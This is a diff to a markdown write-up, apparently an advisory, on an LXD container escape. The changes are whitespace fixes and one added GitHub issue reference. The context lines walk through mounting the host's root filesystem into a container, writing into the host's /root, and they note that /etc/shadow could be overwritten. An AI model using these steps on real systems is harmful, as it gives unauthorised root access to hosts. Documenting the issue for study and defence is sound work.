@@ -22,7 +22,7 @@ Creating test
 ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
 Device whatever added to test 
 ubuntu@ubuntu:~$ lxc start test 
-ubuntu@ubuntu:~$ lxc exec test bash 
+ubuntu@ubuntu:~$ lxc exec test bash
 ```
 
 Here we see us creating a file within the /root/ directory under the mountpoint as shown.
@@ -36,7 +36,7 @@ root@test:/mnt/root# cd root
 root@test:/mnt/root/root# ls 
 root@test:/mnt/root/root# touch ICanDoWhatever 
 root@test:/mnt/root/root# exit 
-exit 
+exit
 ```
 
 And so we see that the file has been created within our root directory.
@@ -45,7 +45,7 @@ And so we see that the file has been created within our root directory.
 ubuntu@ubuntu:~$ sudo su 
 root@ubuntu:/home/ubuntu# ls /root 
 ICanDoWhatever 
-root@ubuntu:/home/ubuntu#  
+root@ubuntu:/home/ubuntu#
 ```
 
 This can be used quite trivially for container escape, as mounting the root directory in a nested container will mount the hosts container as all lxd commands run on the host.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.
@@ -53,4 +53,6 @@ This can be used quite trivially for container escape, as mounting the root dire
 References:
 
 [https://linuxcontainers.org/lxc/getting-started/](https://linuxcontainers.org/lxc/getting-started/)
+
+[https://github.com/lxc/lxd/issues/2003](https://github.com/lxc/lxd/issues/2003)
 
